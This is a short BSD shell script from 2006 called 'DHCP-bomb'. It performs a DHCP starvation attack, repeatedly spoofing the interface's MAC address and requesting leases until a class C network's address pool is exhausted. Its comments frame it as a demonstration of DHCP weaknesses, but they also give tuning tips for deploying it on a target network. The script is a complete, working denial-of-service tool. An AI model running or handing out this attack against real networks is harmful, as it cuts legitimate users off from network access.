#!/bin/sh

#DHCP-bomb - Lars Sommer 2006-05-22, lasg@lasg.dk
#This demonstrates one of _many_ weaknesses in DHCP. 
#This script gives a random mac-address to a given network interface,
# requests an IP through DHCP, and loops these steps 253 times.
#This script is for BSD, but linux version should be alot like this.

#Requirements: 
# Permission to change the mac-address and to run dhclient.
# Program to set a spoofed mac-address. This is not just a random number,
#  and some dhcp-servers (or their firewalls) _may_ check if the mac looks real.
# You could ex. use my "mac-maker" program.

#Tips:
# Tweak LOOPTIMES for your network. 253 is a nice number for a one time
#  dhcp bomb on a class c net, where the dhcpd give all but its own IP.

# This script is bloat and overkill. It would be much nicer with a dummy dhcp
#  client with this purpose only. Write me if you got one. :)


LOOPTIMES=253
IFACE=iwi0

c=0
while [ $c -le ${LOOPTIMES} ];do
	ifconfig ${IFACE} ether `mac-maker` &&
	dhclient ${IFACE} &&
	c=`expr $c + 1`
done


